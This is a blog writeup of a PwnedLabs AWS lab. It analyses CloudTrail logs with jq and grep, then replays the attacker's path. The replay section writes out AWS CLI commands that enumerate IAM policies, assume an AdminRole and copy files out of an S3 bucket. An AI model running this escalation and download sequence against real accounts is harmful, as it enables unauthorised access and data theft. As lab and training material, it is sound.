---
layout: blog
title: PwnedLabs | Breach in the Cloud Writeup
publishDate: 2025-05-23T23:29:00.000Z
description: A beginner lab from PwnedLabs based on AWS CloudTrail log analysis
  and AWS S3 enumeration.
tags:
  - pwnedlabs
  - writeup
  - aws
  - purple-team
---
## Download the zip file

The Cloudtrail logs can be downloaded from the Discord server. After downloading the zip file, I moved it to a dedicated directory for this lab (its always a good practice to keep things organized). Using the `unzip` command, I extracted the log files. The JSON files were not prettified, so it was difficult to read. There are several online tools available to prettify JSON, but the less you leave the terminal, the easier it is to work. I used `jq`, a tool used to prettify JSON data. To get started, you can simply cat the file and pipe the output through `jq` like:

```sh
cat log_file.json | jq .
```

To quickly format all files, run the command:

```sh
for file in *.json; do jq . "$file" > "$file.tmp" && mv "$file.tmp" "$file"; done
```

Command breakdown:
- `for file in *.json; do`: Iterates through all the files with a `.json` extension in the current working directory.
- `jq . "$file"`: Prettifies the content of the file and prints to the standard output. Here `$file` points to a JSON file in each iteration of the for loop.
- `> "$file.tmp"`: Instead of printing the contents to the standard output, write the output to a new file of the same name after appending with `.tmp`. So it will create a new file of the same but with a `.tmp` extension.
- `&& mv "$file.tmp" "$file"; done`: This command basically overwrites the original file with the contents of the new file and deletes the new file. So at the end of execution, we have the same files with the same names, but the contents are now entirely formatted.

## Finding AWS principals in the logs

AWS principals -> IAM users and roles

```sh
grep -r userName | sort -u
```

This command will search for the keyword "userName" across all the log files in the current working directory. The `sort -u` command will only list the unique entries.

## Investigating the log files

Observations after investigating the first few logs for `temp-user`:

- `107513503799_CloudTrail_us-east-1_20230826T2035Z_PjmwM7E4hZ6897Aq.json`: Issued the `GetCallerIdentity` command
- `107513503799_CloudTrail_us-east-1_20230826T2040Z_UkDeakooXR09uCBm.json`: Attempted to issue `ListObjects`, access denied
- `107513503799_CloudTrail_us-east-1_20230826T2050Z_iUtQqYPskB20yZqT.json`: Attempted to issue `ListAccountAliases`, `ListAuthorizers` and many commands, all access denied

On further investigation, I found that the attacker tried to issue a lot of commands which raised over 400 error messages in one log. Finally, the attacker was able to issue the `AssumeRole` command successfully and acquired the `AdminRole`. Following this step, the attacker was successful to download a file `emergency.txt` from the `emergency-data-recovery.s3.amazonaws.com` bucket.

## Retracing steps as an attacker

I use the `aws configure` command and provide the secret keys provided in the lab. The execution can be confirmed by running

```sh
aws sts get-caller-identity
```

The output confirmed that the username was `temp-user`.

Now to list the user policies of this user, I issued the `list-user-policies` command.

```sh
aws iam list-user-policies --user-name temp-user
```

It listed one policy named `test-temp-user`. To check the policy:

```sh
aws iam get-user-policy --user-name temp-user --policy-name test-temp-user
```

This revealed that `temp-user` was allowed to run the `AssumRole` command. That is what the attacker did. So, running this command I assumed  `AdminRole` similar to the attacker.

```sh
aws sts assume-role --role-arn arn:aws:iam::107513503799:role/AdminRole --role-session-name MySession
```

This command will print the access keys which can be used to configure aws. After this, I copied the session token and run this command:

```sh
aws configure set aws_session_token "<token>"
```

Now, running `aws sts get-caller-identity` I verified that I'm now having the `AdminRole` privileges as the `MySession` user that I created using the `AssumeRole` command.

Now I can list the contents of the `emergency-data-recovery` S3 bucket and download the files.

```sh
aws s3 ls s3://emergency-data-recovery
aws s3 cp s3://emergency-data-recovery/emergency.txt .
aws s3 cp s3://emergency-data-recovery/message.txt .
```

The flag was in the `emergency.txt` file.

## Conclusion

In this lab, I learned how to find suspicious activity from AWS Cloudtrail logs and then retrace the steps that the attacker took and successfully find the flag.
